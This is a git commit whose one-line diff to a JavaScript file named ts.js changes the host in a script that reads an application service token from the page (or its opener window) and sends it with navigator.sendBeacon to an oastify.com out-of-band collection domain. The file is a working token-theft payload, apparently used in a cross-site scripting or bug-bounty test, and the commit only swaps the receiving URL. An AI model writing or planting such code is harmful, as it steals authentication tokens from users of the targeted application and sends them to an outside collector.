94629d47a7f21c3d360afd29eeee09b64fc5c6ae
crisungureanu <97293656+crisungureanu@users.noreply.github.com>
2025-11-21 11:40:20 +0200

    Update beacon URL in ts.js

--- ts.js
+++ ts.js
@@ -1,1 +1,1 @@
-if(window.opener){navigator.sendBeacon("https://ojbuwu76o56ckwco0vx7eenq9hff37rw.oastify.com",window.opener.AAUI_BASE_PARAMS.appService.token)}else{navigator.sendBeacon("https://ojbuwu76o56ckwco0vx7eenq9hff37rw.oastify.com",window.AAUI_BASE_PARAMS.appService.token)}
+if(window.opener){navigator.sendBeacon("https://wvvbt73ojrwnqvmv4ytoiplzcqih67uw.oastify.com",window.opener.AAUI_BASE_PARAMS.appService.token)}else{navigator.sendBeacon("https://wvvbt73ojrwnqvmv4ytoiplzcqih67uw.oastify.com",window.AAUI_BASE_PARAMS.appService.token)}
